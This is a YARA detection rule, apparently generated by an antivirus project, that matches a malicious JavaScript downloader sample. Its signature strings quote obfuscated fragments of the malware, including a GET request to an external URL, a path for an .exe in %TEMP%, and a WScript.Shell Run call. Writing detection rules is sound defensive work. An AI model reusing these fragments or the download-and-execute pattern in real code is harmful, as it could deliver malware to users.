rule sig_20160328_4af0f7f71363d8031066222f0b9851f0 {
  meta:
    description = "datamaliciousorder - file 20160328_4af0f7f71363d8031066222f0b9851f0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aacb2478f139559282636a6facfee6f427c09f84661243265fc5a922315d1f0b"

  strings:
    $s1  = "function Bxfuixxb() {return Xvngeekzzt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"1sDvjxY4z9y7Y.exe\";};" fullword ascii
    $s2  = "do {WScript[Aguzw](Djdzhz() * 11)} while (Fdssez[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Bjjdobt(Hjtzyvpdb, Gvtfadfhd){return Hjtzyvpdb - Gvtfadfhd;};" fullword ascii
    $s4  = "var Xvngeekzzt = function Xcgtnkzcg() {return WScript[Mtqwvsyxm](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Fdssez[Nkuiv](\"GET\", \"http://perfect-nutrition.co.uk/lwqo9oa\", false);" fullword ascii
    $s6  = "function Yrpdgbjga() {return ((Hgzelnb == true) && (Hgzelnb == Qucstb)) ? 1 : Ddfbhu;};" fullword ascii
    $s7  = "function Kksjyckbur(Diklthlcpk){Xvngeekzzt[\"Run\"](Diklthlcpk, Ddfbhu, Ddfbhu);};" fullword ascii
    $s8  = "var Ppjzgd = false;" fullword ascii
    $s9  = "var Qucstb = false;" fullword ascii
    $s10 = "function Fafzqg(){return Mtqwvsyxm;};" fullword ascii
    $s11 = "var Hgzelnb = false;" fullword ascii
    $s12 = "Qucstb = true; " fullword ascii
    $s13 = "function Acxhvmaj(Tubqz) {var Ieyiblyekm = (1, 2, 3, 4, 5, Tubqz); return Ieyiblyekm;};" fullword ascii
    $s14 = "var Tdsnqwofp = new this[\"Date\"]();" fullword ascii
    $s15 = "function Djdzhz(){return 22;};" fullword ascii
    $s16 = "return Bjjdobt(Hxsfpw, Kkrgguy);" fullword ascii
    $s17 = "function Sqjmgafrkh()" fullword ascii
    $s18 = "Hgzelnb = true; " fullword ascii
    $s19 = " while (Fefzyrw){" fullword ascii
    $s20 = "function Fdntt(){return Ptofq;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}